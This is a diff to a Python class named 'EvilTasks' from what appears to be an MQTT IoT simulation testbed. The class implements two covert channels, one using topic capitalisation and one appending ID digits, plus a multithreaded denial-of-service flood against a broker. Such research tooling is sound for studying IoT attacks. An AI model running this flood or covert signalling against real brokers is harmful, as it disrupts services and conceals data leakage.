@@ -1,3 +1,16 @@
+##################################### CLASS #############################################
+################################### EVIL TASKS ##########################################
+# CURRENT # 
+# This class is designed to contain malicious tasks and covert channels implementation.
+# In terms of malicious tasks at the moment, only the Denial of service attack is 
+# implemented.
+# The covert channels proposed are 2: one encodes a bit 1 or 0 according to the fact that the
+# first letter of the topic is capital or not.
+# The second covert channel encodes a bit 1 or 0 in the id of the MQTT client.
+# NEXT # 
+# methods will be added to this class in order to implement new features, attacks and
+# covert channels
+
 import time, numpy as np
 import threading
 from Utils.Distributions import Distributions
@@ -10,9 +23,9 @@ class EvilTasks:
 		self.MQTT_object = MQTT_object
 
 
-	##### COVERT COMMUNICATIONS FUNCTIONS #####
 
-	#Embed a message using a certain method. The message is embedded bit by bit	
+	#Embed a message using one of the possible methods
+	### IMPORTANTE: PROVARE A RIMUOVERE MATCH CASE E SELEZIONARE LA FUNZIONE CON INDIRIZZAMENTO DIRETTO -> try {functions[method] ... method()}
 	def embed_message(self, current_topic, flag_bit, method):
 		
 		tokens_topic = current_topic.split("/")
@@ -27,7 +40,6 @@ class EvilTasks:
 				return "/".join(tokens_topic)
 
 			case "id":
-				#new_topic = hide_in_id(current_topic, last_topic, flag_bit)
 				new_topic = self.hide_in_id(last_topic, flag_bit)
 				tokens_topic[-1] = new_topic
 				return "/".join(tokens_topic)
@@ -35,7 +47,9 @@ class EvilTasks:
 			case _:
 				return current_topic
 
-	#First letter is capital then 1 otherwise 0
+
+
+	#First letter of the topic is capital then 1 otherwise 0
 	def hide_in_first_letter(self, current_topic, last_topic, flag_bit):
 		
 		char = last_topic[0]
@@ -52,15 +66,18 @@ class EvilTasks:
 
 		return modified_last_topic
 
+
+
 	#Adds either 0 or 1 to the end of the topic
-	#def hide_in_id(self, current_topic, last_topic, flag_bit):
 	def hide_in_id(self, last_topic, flag_bit):
 		
 		id_number = int(flag_bit) + 1
 		modified_last_topic = last_topic + str(id_number)
 		return modified_last_topic
 
-	#Covert publication method
+
+
+	#Covert publication with specific embedding method
 	def covert_publish(self, publisher, topic, message, payload, qos, method, delay):
 		
 		bit_msg = ""
@@ -71,7 +88,6 @@ class EvilTasks:
 		try:
 			
 			for bit in bit_msg:
-				#print("Ci sono")
 				new_topic = self.embed_message(topic, bit, method=method)
 				print(f"Topic sent: {new_topic}")
 				self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
@@ -79,6 +95,8 @@ class EvilTasks:
 
 		except Exception as e:
 			print(f"Error while sending hidden message")
+
+
 
 	#Periodic publication method. Takes a device config and sends periodically the message
 	def periodic_publish(self, publisher, config):
@@ -104,13 +122,16 @@ class EvilTasks:
 			print(f"Error while collecting data from configuration {e}")
 
 		if device_type == "counterfeit" and covert_message:
+			
 			self.covert_publish(publisher, topic, covert_message, payload, qos, embedding_method, period)
 		else:
 
 			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
 			time.sleep(period)
 
-	#Publication method
+
+
+	#Publication method for event
 	def event_publish(self, publisher, config):
 		
 		if publisher is None:
@@ -139,6 +160,7 @@ class EvilTasks:
 
 		period = 1.0	#default
 
+		### IMPORTANTE: mettere le funzioni come valori di un dictionary aventi come chiavi "uniform", "exponential", "normal", in modo da evitare match case. Racchiudere tutto con blocco try/catch
 		match distribution:
 
 			case "uniform":
@@ -158,14 +180,13 @@ class EvilTasks:
 			period = 1.0
 
 		if device_type == "counterfeit":
+
 			self.covert_publish(publisher, topic, covert_message, payload, qos, embedding_method, period)
 		else:
+
 			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
 			time.sleep(period)
 
-
-
-	##### DENIAL OF SERVICE ATTACK #####
 
 
 	#DoS attack task for each thread
@@ -181,7 +202,9 @@ class EvilTasks:
 			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
 			time.sleep(publish_interval)
 
-	#Spawn num_clients threads and make a DoS_task
+
+
+	#Spawn num_clients threads and each one of them makes a DoS_task
 	def DoS_attack(self, config):
 		
 		num_clients = int(config["NumClients"])
@@ -189,7 +212,8 @@ class EvilTasks:
 		end_time = time.time() + duration
 		topic = config["Topic"]
 		publish_interval = float(config["Period"])
-		print("STO INIZIANDO DOS")
+		print("Starting DoS")
+
 		for i in range(num_clients):
 			thread = threading.Thread(target=self.DoS_task, args=(f"dos_client_{i}", config, end_time))
 			thread.daemon = True
